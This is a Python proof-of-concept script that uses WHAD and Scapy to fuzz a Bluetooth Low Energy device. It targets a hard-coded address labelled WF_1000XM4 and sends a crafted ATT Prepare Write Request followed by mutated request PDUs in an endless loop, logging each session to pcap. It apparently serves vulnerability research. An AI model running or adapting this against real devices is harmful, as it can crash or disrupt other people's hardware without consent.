from whad.ble import Central
from whad.device import WhadDevice
from whad.common.monitors import PcapWriterMonitor

import os
from datetime import datetime
import time

from scapy.layers.bluetooth import *
from scapy.layers.bluetooth4LE import *

import FuzzingPoC as Fuzz

session_cnt = 0
none_cnt = 0

def main_sending(central, bt_addr, is_addr_random):

    global session_cnt
    print("session_cnt = ",session_cnt)
    current_log_case = "log_case_"+str(session_cnt)
    os.mkdir(current_log_case)

    monitor_main = PcapWriterMonitor(current_log_case+"/log.pcap")
    monitor_main.attach(central)
    monitor_main.start()

    print("New connection")
    central.connect(bt_addr , random = is_addr_random)
    central.enable_synchronous(True)

    global none_cnt

    try :

        # Prepare Write Request
        _gatt_handle = 260 # WF_1000XM4
        _offset      = 0x01
        _data        = b'\xaa'
        _len         = 5 + 1
        poc_pdu_1 = BTLE_DATA()/L2CAP_Hdr(len=_len,cid=0x0004)/ATT_Hdr()/ATT_Prepare_Write_Request(gatt_handle=_gatt_handle, offset=_offset, data=_data)

        # Send Prepare Write Request
        central.send_pdu(pdu = poc_pdu_1,conn_handle=central.connection.conn_handle) #xm4

        for i in range(5):

            # Forge Request PDU
            fuzz_pdu = Fuzz.mutator("Request")
            # Send Request PDU
            central.send_pdu(pdu = fuzz_pdu, conn_handle=central.connection.conn_handle)

    except ImportError as IE:  # ImportError

        print("\nError  : ", repr(IE)) 
        f = open(current_log_case + "/error.txt","w")
        f.write(str(datetime.fromtimestamp(time.time()))+"\n")
        f.write(repr(IE))
        f.close()
        monitor_main.detach()
        monitor_main.stop()
        monitor_main.close()

    except Exception as error: # Catch ConnectionLostException for instance

        print("\nError  : ",repr(error))
        f = open(current_log_case + "/error.txt","w")
        f.write(str(datetime.fromtimestamp(time.time()))+"\n")
        f.write(repr(error))
        f.close()
        monitor_main.detach()
        monitor_main.stop()
        monitor_main.close()

    #Disconnect
    print("Stop connection")
    monitor_main.detach()
    monitor_main.stop()
    monitor_main.close()
    session_cnt += 1

central = Central(WhadDevice.create('hci1')) 
bt_addr , is_addr_random  = 'c2:dc:17:e0:7b:ea', True # Connect to WF_1000XM4

while True:

    main_sending(central, bt_addr, is_addr_random)
